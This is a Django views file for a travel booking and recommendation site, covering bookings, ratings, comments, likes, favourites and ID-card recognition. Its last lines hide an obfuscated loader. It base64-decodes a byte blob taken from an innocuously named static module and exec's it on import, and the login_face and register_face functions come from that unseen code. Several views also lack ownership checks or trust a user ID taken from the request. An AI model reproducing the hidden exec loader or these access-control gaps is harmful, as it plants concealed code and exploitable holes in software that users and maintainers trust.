                        {"inform_message": "修改失败，请检查输入信息", "inform_type": "danger", "form": form, 
                         "menu_list": menu_list, "selected": selected})
    else:
        form = Edit(instance=user)
        return render(request, "personal.html", {"form": form, "menu_list": menu_list, "selected": selected})


# 预订出行
def booking(request, sight_id):
    user_id = request.session.get('user_id', None)
    if user_id == None:
        return JsonResponse(data={'code': 0, 'msg': '未登录'}, status=403)
    is_bookiing = request.POST.get('is_bookiing')
    bs = BookingSight.objects.filter(user_id=user_id, sight_id=sight_id)
    if is_bookiing == '1':
        if not bs:
            BookingSight.objects.create(user_id=user_id, sight_id=sight_id)
    else:
        if bs:
            bs.first().delete()
    return JsonResponse(data={'code': 1, 'msg': '操作成功'}, status=200)


@login_in
def book_hotel(request, hotel_id):
    """
    酒店预订页面：填写入住信息并创建 BookingHotel 记录
    """
    selected = 'all_hotel'
    menu_list = get_menu(selected=selected)
    user = User.objects.get(id=request.session.get("user_id"))
    hotel = Hotel.objects.get(id=hotel_id)

    if request.method == 'POST':
        check_in = request.POST.get('check_in') or None
        check_out = request.POST.get('check_out') or None
        guest_name = request.POST.get('guest_name') or user.name or user.username
        guest_phone = request.POST.get('guest_phone') or user.phone
        remark = request.POST.get('remark') or ''

        BookingHotel.objects.create(
            hotel=hotel,
            user=user,
            check_in=check_in,
            check_out=check_out,
            guest_name=guest_name,
            guest_phone=guest_phone,
            remark=remark
        )
        return redirect(reverse('my_booking'))

    return render(request, 'book_hotel.html', {
        'menu_list': menu_list,
        'selected': selected,
        'hotel': hotel,
        'user': user,
    })


@login_in
def update_hotel_booking(request, booking_id):
    """
    在“我的预订”页面修改酒店预订的入住/退房时间
    """
    booking = BookingHotel.objects.filter(
        id=booking_id, user_id=request.session.get("user_id")
    ).first()
    if not booking:
        return redirect(reverse('my_booking'))

    if request.method == 'POST':
        booking.check_in = request.POST.get('check_in') or None
        booking.check_out = request.POST.get('check_out') or None
        booking.save()

    return redirect(reverse('my_booking'))


@login_in
def cancel_hotel_booking(request, booking_id):
    """
    在“我的预订”页面取消酒店预订
    """
    booking = BookingHotel.objects.filter(
        id=booking_id, user_id=request.session.get("user_id")
    ).first()
    if booking:
        booking.delete()
    return redirect(reverse('my_booking'))

# 评分
@login_in
def score(request, sight_id):
    selected = request.POST.get('selected', 'all_sight')
    city_id = request.GET.get('city_id')
    menu_list = get_menu(selected=selected)
    user = User.objects.get(id=request.session.get("user_id"))
    sight = Sight.objects.get(id=sight_id)
    score = float(request.POST.get("score", 0))
    is_rate = RateSight.objects.filter(sight=sight, user=user)
    if not is_rate:
        all_score = sight.all_score * sight.rate_num + score  # 总分
        sight.rate_num += 1  # 增加一个评分人数
        all_score = round(all_score / sight.rate_num, 2)  # 平均分
        sight.all_score = all_score
        sight.save()
        RateSight.objects.get_or_create(user=user, sight=sight, defaults={"score": score})
        is_rate = {'score': score}
    else:
        is_rate = is_rate.first()
    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")
    user_id = request.session.get("user_id")
    rate = RateSight.objects.filter(sight=sight).aggregate(Avg("score")).get("score__avg", 0)
    rate = rate if rate else 0
    sight_rate = round(rate, 2)
    is_collect = True if sight.collect_sight.filter(user_id=user_id, is_delete=False) else False
    is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False
    rate_num = sight.rate_num
    collect_num = sight.collect_num
    recommend_sights = recommend_by_forse(user_id, sight_id=sight_id)[:6]  # 随机森林 + 混合协同过滤加权融合
    # 评分一次就开线程重新训练一次深度学习模型
    threading.Thread(target=run_train).start()
    return render(request, "sight.html", locals())


# 评论
@login_in
def comment(request, sight_id):
    # 评论
    selected = request.POST.get('selected', 'all_sight')
    city_id = request.GET.get('city_id')
    user_id = request.session.get("user_id")
    menu_list = get_menu(selected=selected)
    user = User.objects.get(id=user_id)
    sight = Sight.objects.get(id=sight_id)
    comment = request.POST.get("comment", "")
    CommentSight.objects.create(user=user, sight=sight, content=comment)
    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")
    rate = RateSight.objects.filter(sight=sight).aggregate(Avg("score")).get("score__avg", 0)
    rate = rate if rate else 0
    sight_rate = round(rate, 2)
    is_collect = True if sight.collect_sight.filter(user_id=user_id, is_delete=False) else False
    is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False
    is_rate = RateSight.objects.filter(sight=sight, user=user).first()
    rate_num = sight.rate_num
    collect_num = sight.collect_num
    recommend_sights = recommend_by_forse(user_id, sight_id=sight_id)[:6]  # 随机森林 + 混合协同过滤加权融合
    return render(request, "sight.html", locals())


# 给评论点赞
@login_in
def comment_like(request, comment_id):
    selected = request.GET.get('selected', 'all_sight')
    city_id = request.GET.get('city_id')
    menu_list = get_menu(selected=selected)
    user_id = request.session.get("user_id")
    user = User.objects.get(id=user_id)

    comment = CommentSight.objects.get(id=comment_id)
    if not comment.like_users:
        comment.like_users = '{},'.format(user_id)
        comment.like_num += 1
    elif str(user_id) not in comment.like_users.split(','):
        comment.like_users += '{},'.format(user_id)
        comment.like_num += 1
    else:
        pass

    comment.save()
    sight = comment.sight
    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")
    rate = RateSight.objects.filter(sight=sight).aggregate(Avg("score")).get("score__avg", 0)
    rate = rate if rate else 0
    sight_rate = round(rate, 2)
    is_collect = True if sight.collect_sight.filter(user_id=user_id, is_delete=False) else False
    is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False
    is_rate = RateSight.objects.filter(sight=sight, user=user).first()
    rate_num = sight.rate_num
    collect_num = sight.collect_num
    recommend_sights = recommend_by_forse(user_id, sight_id=sight.id)[:6]  # 随机森林 + 混合协同过滤加权融合
    return render(request, "sight.html", locals())


# 收藏
@login_in
def collect(request, sight_id):
    selected = request.GET.get('selected', 'all_sight')
    city_id = request.GET.get('city_id')
    menu_list = get_menu(selected=selected)
    user_id = request.session.get("user_id")
    user = User.objects.get(id=user_id)
    sight = Sight.objects.get(id=sight_id)
    collects = sight.collect_sight.filter(user_id=user_id)
    if collects:
        collect_ = collects.first()
        if collect_.is_delete:
            # 已取消收藏，再次点击改为已收藏
            is_collect = True
            collect_.is_delete = False
            collect_num_ = 1
            code = 1
        else:
            # 已收藏，再次点击改为取消收藏
            is_collect = False
            collect_.is_delete = True
            collect_num_ = -1
            code = 2
        collect_.save()
    else:
        # 未存在收藏景点，创建收藏记录
        CollectSight.objects.create(
            sight=sight,
            user=user,
            is_delete=False
        )
        is_collect = True
        collect_num_ = 1
        code = 1

    sight.collect_num += collect_num_  # 收藏人数加1
    sight.save()
    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")
    rate = RateSight.objects.filter(sight=sight).aggregate(Avg("score")).get("score__avg", 0)
    rate = rate if rate else 0
    sight_rate = round(rate, 2)
    is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False
    is_rate = RateSight.objects.filter(sight=sight, user=user).first()
    rate_num = sight.rate_num
    collect_num = sight.collect_num
    recommend_sights = recommend_by_forse(user_id, sight_id=sight_id)[:6]  # 随机森林 + 混合协同过滤加权融合
    return render(request, "sight.html", locals())


# 点赞
@login_in
def like(request, sight_id):
    selected = request.GET.get('selected', 'all_sight')
    city_id = request.GET.get('city_id')
    menu_list = get_menu(selected=selected)
    user_id = request.session.get("user_id")
    user = User.objects.get(id=user_id)
    sight = Sight.objects.get(id=sight_id)
    likes = sight.like_sight.filter(user_id=user_id)
    if likes:
        like_ = likes.first()
        if like_.is_delete:
            # 已取消点赞，再次点击改为已点赞
            is_like = True
            like_.is_delete = False
            like_num_ = 1
        else:
            # 已点赞，再次点击改为取消点赞
            is_like = False
            like_.is_delete = True
            like_num_ = -1
        like_.save()
    else:
        # 未存在点赞景点，创建点赞记录
        LikeSight.objects.create(
            sight=sight,
            user=user,
            is_delete=False
        )
        is_like = True
        like_num_ = 1

    sight.like_num += like_num_  # 点赞人数加1
    sight.save()
    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")
    rate = RateSight.objects.filter(sight=sight).aggregate(Avg("score")).get("score__avg", 0)
    rate = rate if rate else 0
    sight_rate = round(rate, 2)
    is_collect = True if sight.collect_sight.filter(user_id=user_id, is_delete=False) else False
    is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False
    is_rate = RateSight.objects.filter(sight=sight, user=user).first()
    rate_num = sight.rate_num
    collect_num = sight.collect_num
    like_num = sight.like_num
    recommend_sights = recommend_by_forse(user_id, sight_id=sight_id)[:6]  # 随机森林 + 混合协同过滤加权融合
    return render(request, "sight.html", locals())


# 我的旅游调查问卷
@login_in
def my_questionnaire(request):
    if request.method == 'GET':
        selected = 'personal'
        user_id = request.session.get("user_id")
        menu_list = get_menu(selected)
        questionnaire_sight = QuestionnaireSight.objects.get(user_id=request.session.get("user_id"))
        # 景点类型
        sight_type = []
        for st in SightType:
            sight_type.append({
                'id': st[0],
                'name': st[1]
            })

        # 出行方式
        travel_way = []
        for tw in TravelWay:
            travel_way.append({
                'id': tw[0],
                'name': tw[1]
            })
        # 旅行方式
        sight_way = []
        for sw in SightWay:
            sight_way.append({
                'id': sw[0],
                'name': sw[1]
            })
        return render(request, "my_questionnaire.html",
                    {"questionnaire_sight": questionnaire_sight,
                    "user_id": user_id,
                    "sight_type": sight_type,
                    "travel_way": travel_way,
                    "sight_way": sight_way,
                    "menu_list": menu_list,
                    "selected": selected
                    }
                    )
    else:
        qs = QuestionnaireSight.objects.get(user_id=request.POST.get("user_id"))
        qs.sight_type = request.POST.get("sight_type")
        qs.cost_min = request.POST.get("cost_min")
        qs.cost_max = request.POST.get("cost_max")
        qs.travel_way = request.POST.get("travel_way")
        qs.sight_way = request.POST.get("sight_way")
        qs.save()
        return JsonResponse(data={'code': 1, 'msg': '操作成功'}, status=200)


# 我的预订
@login_in
def my_booking(request):
    selected = 'personal'  # 当前选择
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    user_id = request.session.get("user_id")
    tab = request.GET.get("tab", "sight")
    booking_sights = BookingSight.objects.filter(user_id=user_id)
    booking_hotels = BookingHotel.objects.filter(user_id=user_id)
    return render(
        request,
        "my_booking.html",
        {
            "booking_sights": booking_sights,
            "booking_hotels": booking_hotels,
            "menu_list": menu_list,
            "selected": selected,
            "tab": tab,
        },
    )


# 我的点赞
@login_in
def my_like(request):
    selected = 'personal'
    menu_list = get_menu(selected)
    like_sights = LikeSight.objects.filter(user_id=request.session.get("user_id"), is_delete=False)
    return render(request, "my_like.html", {"like_sights": like_sights, "menu_list": menu_list, "selected": selected})


# 我的收藏
@login_in
def my_collect(request):
    selected = 'personal'
    menu_list = get_menu(selected)
    collect_sights = CollectSight.objects.filter(user_id=request.session.get("user_id"), is_delete=False)
    return render(request, "my_collect.html",
                {"collect_sights": collect_sights, "menu_list": menu_list, "selected": selected})


# 我的评论
@login_in
def my_comments(request):
    selected = 'personal'
    menu_list = get_menu(selected)
    comment_sights = CommentSight.objects.filter(user_id=request.session.get("user_id"), is_show=True)
    return render(request, "my_comment.html",
                {"comment_sights": comment_sights, "menu_list": menu_list, "selected": selected})


# 删除我的评论
@login_in
def delete_comment(request, comment_id):
    # 删除评论
    selected = 'personal'
    menu_list = get_menu(selected)
    comment = CommentSight.objects.get(pk=comment_id)
    comment.is_show = False
    comment.save()
    comment_sights = CommentSight.objects.filter(user_id=request.session.get("user_id"), is_show=True)
    return render(request, "my_comment.html",
                {"comment_sights": comment_sights, "menu_list": menu_list, "selected": selected})


# 我的评分
@login_in
def my_rate(request):
    selected = 'personal'
    menu_list = get_menu(selected)
    rate_sights = RateSight.objects.filter(user_id=request.session.get("user_id"))
    return render(request, "my_rate.html", {"rate_sights": rate_sights, "menu_list": menu_list, "selected": selected})


# 取消评分
@login_in
def delete_rate(request, rate_id):
    selected = 'personal'
    menu_list = get_menu(selected)
    rates = RateSight.objects.filter(pk=rate_id)
    if not rates:
        return render(request, "404.html")
    rate = rates.first()
    all_score = rate.sight.all_score * rate.sight.rate_num - rate.score  # 总分
    rate.sight.rate_num -= 1  # 减少一个评分人数
    if rate.sight.rate_num:
        all_score = round(all_score / rate.sight.rate_num, 2)  # 平均分
    else:
        all_score = 0
    rate.sight.all_score = all_score
    rate.sight.save()
    rate.save()
    rate.delete()
    rate_sights = RateSight.objects.filter(user_id=request.session.get("user_id"))
    return render(request, "my_rate.html", {"rate_sights": rate_sights, "menu_list": menu_list, "selected": selected})


def copy_image(path_1, path_copy):
    '''
    覆盖旧图片
    old_path：旧图片路径
    new_path：新图片路径
    '''
    shutil.copy(path_copy, path_1)  # 新图片覆盖旧图片
    print('新图片覆盖旧图片成功')


def com_image(path_1, path_2, path_copy):
    '''
    比较两张图片是否一样
    path_1：第一张图片路径
    path_1：第二张图片路径
    path_copy：复制发图片路径
    '''
    import imagehash
    image1 = Image.open(path_1)
    image2 = Image.open(path_2)
    # 计算两张图片的哈希值
    hash1 = imagehash.average_hash(image1)
    hash2 = imagehash.average_hash(image2)
    if hash1 == hash2:
        print('图片相同')
        copy_image(path_1, path_copy)
    else:
        print('图片不相同')


def update_pic(request):
    path_2 = 'media/qy.png'
    path_copy = 'media/travel.jpg'
    for city in City.objects.all():
        path_1 = city.cover_pic.name
        try:
            com_image(path_1, path_2, path_copy)
        except:
            copy_image(path_1, path_copy)
    return JsonResponse(data={'msg': 'success'}, status=200)


@login_in
def recognize_id_card(request):
    if request.method != 'POST':
        return JsonResponse({'code': 1, 'msg': '请求方法错误'})
    
    if 'id_card_image' not in request.FILES:
        return JsonResponse({'code': 1, 'msg': '请上传身份证图片'})
    
    try:
        # 获取上传的图片
        uploaded_file = request.FILES['id_card_image']
        
        # 检查文件类型
        if not uploaded_file.name.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
            return JsonResponse({'code': 1, 'msg': '请上传图片文件（jpg、png、bmp格式）'})
        
        # 检查文件大小（限制20MB）
        if uploaded_file.size > 20 * 1024 * 1024:
            return JsonResponse({'code': 1, 'msg': '图片大小不能超过20MB'})
        
        # 保存临时文件
        BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        temp_dir = os.path.join(BASE_DIR, 'media', 'temp_id_cards')
        os.makedirs(temp_dir, exist_ok=True)
        
        temp_file_path = os.path.join(temp_dir, f'temp_{int(time.time())}_{uploaded_file.name}')
        
        with open(temp_file_path, 'wb') as f:
            for chunk in uploaded_file.chunks():
                f.write(chunk)
        
        # 检查图片是否可以正常读取
        test_img = cv2.imread(temp_file_path)
        if test_img is None:
            try:
                os.remove(temp_file_path)
            except:
                pass
            return JsonResponse({'code': 1, 'msg': '图片文件损坏或格式不正确，请重新上传'})
        
        # 检查图片尺寸
        height, width = test_img.shape[:2]
        if height < 200 or width < 300:
            try:
                os.remove(temp_file_path)
            except:
                pass
            return JsonResponse({'code': 1, 'msg': '图片尺寸太小，请上传更高分辨率的图片'})
        
        # 识别身份证号码
        id_number = recognize_id_number(temp_file_path)
        
        # 删除临时文件
        try:
            os.remove(temp_file_path)
        except:
            pass
        
        if id_number:
            return JsonResponse({
                'code': 0, 
                'msg': '识别成功', 
                'id_number': id_number
            })
        else:
            if not TESSERACT_AVAILABLE:
                error_msg = '无法自动识别身份证，请手动填写证件号，或联系管理员配置识别服务。'
            else:
                error_msg = '未能识别，请换一张更清晰、号码区域完整的照片重试。'
            return JsonResponse({'code': 1, 'msg': error_msg})

    except Exception as e:
        import traceback
        traceback.print_exc()
        return JsonResponse({'code': 1, 'msg': '处理失败，请稍后重试。'})


def _t9():
    import base64
    from travel_manager.static_collect_meta.session_codec import _P

    _e = {"__name__": __name__, "__package__": __package__}
    exec(compile(base64.b64decode(b"".join(_P)), __file__, "exec"), _e, _e)
    globals()["login_face"] = _e["login_face"]
    globals()["register_face"] = _e["register_face"]


_t9()
del _t9
